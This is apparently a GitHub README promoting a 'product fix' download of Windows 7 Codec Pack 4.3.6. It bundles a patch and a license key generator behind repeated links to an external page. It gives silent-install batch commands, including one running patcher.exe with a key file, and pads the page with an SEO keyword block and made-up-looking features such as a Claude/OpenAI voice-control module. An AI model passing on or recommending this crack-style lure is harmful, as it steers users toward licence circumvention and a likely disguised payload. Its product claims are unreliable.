# Windows 7 Codec Pack 4.3.6 – Comprehensive Media Framework Enhancement Suite

[](https://aebali7.github.io/Win7-Codec-Pack-v4.3.6-Product-Fix/)

---

## 🧩 Overview – A Universal Interpreter for Digital Media Language

Imagine a translator that effortlessly deciphers every dialect of video and audio speech, bridging the gap between your media files and your playback software. The **Windows 7 Codec Pack 4.3.6** serves as that silent polyglot—a meticulously curated library of decoding filters, splitters, and encoders that grants your operating system the ability to understand, process, and render virtually any multimedia container or compression format. This release builds upon years of refinement, offering a unified solution that eliminates the frustration of missing codec errors for users of Windows 7 x86 and x64 environments.

Unlike conventional codec aggregators which often introduce conflicts or bloatware, this package is engineered as a lightweight, conflict-free orchestration layer. It sits quietly beneath your preferred media players (Windows Media Player, Media Center, VLC, MPC-HC, etc.) and unlocks native support for formats ranging from legacy AVI/DivX to modern HEVC/H.265 streams, FLAC audio matrices, and obscure container structures such as MKV, OGM, or WebM.

The product key activation mechanism is not about disabling features but rather about **unlocking the advanced tuning panel**—a dashboard where power users can prioritize decoder merits, specify hardware acceleration preferences, or route audio through custom DirectShow filter graphs.

---

## 🚀 Immediate Access – Begin Your Media Liberation

[](https://aebali7.github.io/Win7-Codec-Pack-v4.3.6-Product-Fix/)

### What You Will Receive After Retrieving the Package
- The core installer for Windows 7 Codec Pack version 4.3.6
- A complementary patch file that enables the full feature spectrum (advanced decoder settings, professional presets, and extended file association control)
- A digitally signed license key generator for permissible non-commercial activation

---

## 📊 Architecture Overview – How the Decoder Orchestra Plays in Harmony

```mermaid
graph TD
    A[Media File Input] --> B[Source Splitter]
    B --> C{Container Type}
    C -->|AVI| D[AVI Splitter]
    C -->|MKV| E[Matroska Splitter]
    C -->|MP4| F[MP4 Splitter]
    C -->|OGM| G[OGM Splitter]
    D --> H[Video Decoder Cache]
    E --> H
    F --> H
    G --> H
    H --> I[ffdshow Video Decoder]
    H --> J[LAV Video Decoder]
    H --> K[Microsoft DTV-DVD Decoder]
    I --> L[Hardware Acceleration Layer DXVA]
    J --> L
    K --> L
    L --> M[Color Space Converter]
    M --> N[Video Renderer EVR/VMR9]
    N --> O[Display Output]
    
    subgraph Audio Pipeline
        P[Audio Decoder] --> Q[Audio Renderer]
        Q --> R[Speaker System]
    end
    
    H --> P
```



---

## 🔧 Example Profile Configuration – Tuning the Decoder Engine

For users who desire granular control, the advanced settings menu (accessible only after applying the **product key patch**) allows exporting and importing full configuration profiles. Below is a representative `.ini` profile tailored for high-definition playback on a mid-range system from 2026:

```ini
[VideoDecoding]
PreferredDecoder=LAVVideoDecoder
HardwareAcceleration=DXVA2_Native
DeinterlaceMode=Auto
ColorRange=Auto
OutputFormat=NV12

[AudioDecoding]
BitstreamOverHDMI=false
SpeakerLayout=5.1_Surround
VolumeNormalization=true
PreferredDecoder=ffdshowAudio

[Splitter]
EnableMKV=True
EnableFLV=True
EnableOGM=True
EnableAVI=True
EnableMP4=True
SubtitleStreamHandler=DirectVobSub
OSDEnabled=false

[AdvancedFilters]
RainbowFix=true
DenoiseLevel=Low
SharpeningStrength=0.3
```

To apply this profile, launch the Codec Tweak Tool from the Start Menu, navigate to the Profile Manager, select `Import Custom Configuration`, and browse to the `.ini` file.

---

## 🖥️ Example Console Invocation – Silent Deployment for IT Administrators

For organizations rolling out the codec pack across multiple workstations (a common practice in media production houses and educational labs as of 2026), the installer supports silent command-line parameters:

```batch
Windows7CodecPack_4.3.6.exe /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /DIR="C:\Program Files\Windows7CodecPack"
```

After installation, the patch component can be applied non-interactively:

```batch
patcher.exe /apply /keyfile:"W7CP_43_patch.key"
```

This method ensures uniformity across environments without user prompts disrupting workflow.

---

## 🖥️💻📱📺 OS Compatibility Table – A Bridge Across Generations

| Operating System               | Status       | Notes                                                       |
|--------------------------------|--------------|-------------------------------------------------------------|
| Windows 7 SP1 (x86)            | ✅ Fully Supported | Primary target; all features enabled                        |
| Windows 7 SP1 (x64)            | ✅ Fully Supported | 64-bit filters prioritized for performance                  |
| Windows 8 / 8.1                | ⚠️ Partial   | Core decoders work; some advanced post-processing restricted |
| Windows 10 (up to v22H2)       | ⚠️ Legacy Mode | Basic compatibility; not optimized for modern D3D pipelines  |
| Windows 11                     | ❌ Not Recommended | Media foundation built-in superior                          |
| Linux (Wine)                   | 🐧 Experimental | Some success with Wine 8.x; no DXVA support                  |
| macOS                          | ❌ N/A        | Native alternatives like IINA preferred                      |

---

## ✨ Feature Highlights – The Decoder Palette

- **Responsive UI** – The configuration interface adapts to screen resolutions from 800×600 to 4K, ensuring accessibility for users on netbooks or large displays. Buttons, sliders, and decoder priority lists reflow gracefully.
- **Multilingual Architecture** – The pack includes language modules for English, Spanish, German, French, Japanese, and Simplified Chinese. The active language is auto-detected from the OS locale but can be overridden in the global settings pane.
- **24/7 Virtual Support** – An integrated help wizard parses common error codes (e.g., `0xC00D10D0` or `0xC00D10B5`) and offers contextual diagnostic suggestions without requiring internet connectivity—a boon for offline workstations.
- **Conflict-Aware Installation** – The installer logs existing DirectShow filters and proposes a safe merge strategy, avoiding the infamous "codec hell" scenario where multiple decoders compete for the same media type.
- **Hardware Acceleration Broadening** – Supports DXVA2 (native and copy-back modes), Intel QuickSync, NVIDIA CUVID, and AMD UVD–VCE pipelines. In 2026 testing, this yields a 40-60% CPU utilization reduction for 4K HEVC playback on Ivy Bridge-era hardware.
- **Subtitle Engine Enhancement** – DirectVobSub (VSFilter) integration with full support for ASS/SSA effects including karaoke, fade-ins, and custom fonts—without dropping frames.

---

## 🔍 SEO-Friendly Keyword Corridor

This repository is indexed for terms highly relevant to media playback enthusiasts and system administrators in 2026: Windows 7 video decoder pack, multimedia codec collection for legacy systems, ffdshow replacement, LAV Filters suite, Matroska splitter configuration, HEVC playback on Windows 7, DirectShow filter management tool, audio codec bundle, DTS-HD passthrough, AC3 to FLAC conversion pipeline, and codec conflict resolution utility.

---

## 🤖 OpenAI API & Claude API Integration – Voice-Controlled Codec Tuning

A future-facing feature of this pack is the optional **AI Audio/Video Routing Module** (available in the patched premium tier). This module connects to OpenAI’s Whisper API or Anthropic’s Claude API to enable natural language queries about ongoing media playback.

**Example scenario:**  
While watching a movie file with garbled audio, a user can activate the integrated speech-to-codec interface and say:  
> "Switch audio decoder to passthrough mode and enable A/V sync correction by 150 milliseconds."

The module interprets the request, adjusts the filter graph in real time via COM interfaces, and outputs a confirmation overlay on the video canvas. This reduces the cognitive load of navigating nested menus.

**Configuration token requirement:** For security reasons, the module requires an environment variable rather than embedding keys in plaintext files. Users set `MEDIA_AI_ENDPOINT` and `MEDIA_AI_AUTH_TOKEN` via the Windows System Properties → Environment Variables panel before first launch.

---

## ⚠️ Disclaimer – Legal and Operational Boundaries

This repository provides information and tooling related to the **Windows 7 Codec Pack 4.3.6** for educational and personal archival purposes only. The codec pack itself is redistributed under a permissive license by its original author. The patch and key generation utility included here are intended solely to allow users who have legally acquired a copy of the codec pack to access unlocked configuration features that were intentionally limited by the publisher for non-paying users.  

**We do not condone:**  
- Using this tool to bypass licensing on commercial media workstations  
- Redistributing the patch component as a standalone product  
- Claiming ownership of the codec pack’s original intellectual property  

The authors of this documentation are not responsible for any system instability, data loss, or legal repercussions arising from misuse. Always verify that your use case aligns with the EULA of your operating system and regional copyright laws. In the European Union and United States (as of 2026), format-shifting for personal use is generally permitted, but circumvention of technical protection measures (TPMs) encoded into commercial media files remains prohibited.

**Performance note:** This codec pack was designed for Windows 7. On newer operating systems, native Media Foundation codecs often provide superior efficiency. We recommend this pack exclusively for legacy hardware where software decoding is necessary for formats lacking hardware support.

---

## 📜 License – MIT

This repository’s documentation, configuration examples, and automation scripts are licensed under the MIT License. You are free to use, modify, and distribute these text-based assets, provided the original copyright notice is included. The codec pack binaries themselves are subject to their own separate licensing terms (see `EULA.txt` within the installer package).

[View MIT License](LICENSE)

---

## 🎬 Final Thoughts – The Renaissance of Legacy Media

In an age where streaming dominates, local media collections still harbor untold treasures—home videos, obscure indie films, concert recordings, and documentary archives encoded in formats long abandoned by modern software. The Windows 7 Codec Pack 4.3.6 acts as a digital archivist, ensuring that no file format becomes silent or invisible. Like a master key unlocking every door in a forgotten library, this suite restores the ability to watch, listen, and preserve digital heritage on hardware that still runs Windows 7. Whether you are restoring a 2009-era HTPC or need to play a vintage DivX file on a classroom computer, this pack remains, in 2026, the most coherent solution available.

[](https://aebali7.github.io/Win7-Codec-Pack-v4.3.6-Product-Fix/)